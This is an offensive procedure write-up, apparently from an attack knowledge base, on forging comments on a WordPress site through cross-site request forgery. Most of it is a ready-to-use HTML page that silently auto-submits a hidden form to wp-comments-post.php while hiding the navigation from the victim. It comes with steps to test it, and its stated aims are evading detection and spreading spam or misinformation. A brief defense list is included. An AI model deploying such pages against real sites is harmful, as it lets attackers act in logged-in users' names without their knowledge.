---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - csrf
  - html-crafting
  - wordpress
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:23.192Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-Malicious-CSRF-HTML-Page-for-WordPress-Comments

## Summary

This procedure involves creating a malicious HTML page that exploits the CSRF vulnerability in WordPress's comment posting by forging a POST request to wp-comments-post.php without a valid token, allowing arbitrary comment injection.

## Description

In a typical attack scenario, the attacker analyzes the WordPress comment form to replicate its parameters. The crafted page uses a hidden form and JavaScript to submit data mimicking a legitimate comment, targeting a specific post ID. This works because the endpoint lacks proper CSRF token validation, enabling cross-site requests from an authenticated user's browser. Prerequisites include knowledge of the target site's URL structure and post IDs, obtainable via public browsing.

## Requirements

1. Access to a text editor or HTML authoring tool
2. Knowledge of the target WordPress site's base URL (e.g., http://localhost/wordpress/wordpress-5.4.2/wordpress/)
3. Specific post ID for targeting (e.g., 29)

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all POST endpoints, especially comment submissions
- Use Content Security Policy (CSP) to restrict form submissions to same-origin
- Monitor for unusual comment patterns or sources in logs

## Objectives

1. Forge a POST request to post arbitrary comments as the victim
2. Avoid detection by mimicking legitimate form data
3. Target specific posts for spam or misinformation

## Instructions

### Step 1: Set Up HTML Structure

**Context**: Create the base HTML with JavaScript to handle browser history and prevent the user from noticing the submission.

Create a file named csrf.html with the following content:

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<script>history.pushState('', '', '/');</script>
<form action="http://localhost/wordpress/wordpress-5.4.2/wordpress/wp-comments-post.php" method="POST" id="csrfForm">
    <input type="hidden" name="comment" value="csrf_comment">
    <input type="hidden" name="submit" value="Post Comment">
    <input type="hidden" name="comment_post_ID" value="29">
    <input type="hidden" name="comment_parent" value="0">
    <input type="submit" value="Click to Proceed">
</form>
<script>document.getElementById('csrfForm').submit();</script>
</body>
</html>
```

> This script auto-submits the form upon load, pushing a state to avoid navigation warnings. Expected output: Form ready for submission.

### Step 2: Test the Page Locally

**Context**: Verify the HTML loads and submits correctly in a browser.

Open csrf.html in a browser while logged into the target WordPress site in another tab. Ensure cookies are shared.

> Expected output: The form submits, and the comment appears on the target post without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[wordpress]]
- [[web-exploitation]]
